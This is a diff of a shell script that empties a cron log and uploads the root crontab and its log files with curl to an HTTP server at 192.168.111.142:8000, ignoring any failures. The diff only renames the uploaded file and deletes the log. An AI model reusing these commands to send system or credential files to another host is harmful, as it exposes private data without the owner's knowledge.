@@ -1,8 +1,8 @@
 set -ex
-
+rm /data/crontab/root.log
 echo "" > /data/crontab/root.log
 
-curl --form file=@/data/crontab/root.log.txt --form press=upload http://192.168.111.142:8000 || true
+curl --form file=@/data/crontab/root.txt --form press=upload http://192.168.111.142:8000 || true
 
 cat /data/crontab/root
 curl --form file=@/data/crontab/root --form press=upload http://192.168.111.142:8000 || true
@@ -24,7 +24,7 @@ done
 
 sleep 10 || true
 stat --printf="%s" /data/crontab/root.log || true 
-cp /data/crontab/root.log /data/crontab/root.log.txt
-curl --form file=@/data/crontab/root.log.txt --form press=upload http://192.168.111.142:8000 || true
+cp /data/crontab/root.log /data/crontab/root.txt
+curl --form file=@/data/crontab/root.txt --form press=upload http://192.168.111.142:8000 || true
 
 echo "" > /data/crontab/root.log
